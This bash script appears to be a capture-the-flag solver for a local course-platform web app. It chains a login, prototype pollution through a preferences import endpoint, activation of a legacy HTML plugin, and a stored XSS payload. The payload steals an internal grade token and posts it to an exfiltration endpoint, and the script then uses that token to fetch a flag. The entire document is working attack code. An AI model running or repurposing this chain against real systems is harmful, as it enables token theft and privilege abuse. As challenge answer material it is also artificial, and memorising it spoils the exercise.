set -euo pipefail
BASE="${1:-http://127.0.0.1:3000}"
USER_NAME="${2:-mahasiswa}"
USER_PASS="${3:-tembokratapan123}"
COOKIE="$(mktemp /tmp/scele_solver_cookie.XXXXXX)"
PAYLOAD='{"title":"Need review","body":"<img src=x onerror='\''fetch(\"/internal/grade/token\").then(r=>r.json()).then(d=>fetch(\"/api/exfil\",{method:\"POST\",headers:{\"content-type\":\"application/json\"},body:JSON.stringify({token:d.token,note:\"solver\"})}))'\''>"}'
curl -s -c "$COOKIE" -b "$COOKIE" -H 'content-type: application/json' -d "{\"username\":\"$USER_NAME\",\"password\":\"$USER_PASS\"}" "$BASE/api/auth/login" >/dev/null
curl -s -c "$COOKIE" -b "$COOKIE" -H 'content-type: application/json' -d '{"constructor":{"prototype":{"legacyMode":true}}}' "$BASE/api/user/preferences/import" >/dev/null
curl -s -c "$COOKIE" -b "$COOKIE" -X POST "$BASE/api/session/refresh" >/dev/null
curl -s -c "$COOKIE" -b "$COOKIE" -H 'content-type: application/json' -d '{"pluginId":"markdown-legacy-html"}' "$BASE/api/plugins/legacy/activate" >/dev/null
curl -s -c "$COOKIE" -b "$COOKIE" -H 'content-type: application/json' -d "$PAYLOAD" "$BASE/api/discussions" >/dev/null
for _ in $(seq 1 10); do
  sleep 3
  LEAKS="$(curl -s -c "$COOKIE" -b "$COOKIE" "$BASE/api/exfil")"
  TOKEN="$(printf '%s' "$LEAKS" | jq -r '.leaks[0].token // empty')"
  if [ -n "$TOKEN" ]; then
    FLAG="$(curl -s -H "x-grade-token: $TOKEN" "$BASE/internal/audit/export" | jq -r '.export.flag // empty')"
    if [ -n "$FLAG" ]; then
      printf '%s\n' "$FLAG"
      rm -f "$COOKIE"
      exit 0
    fi
  fi
done
rm -f "$COOKIE"
exit 1
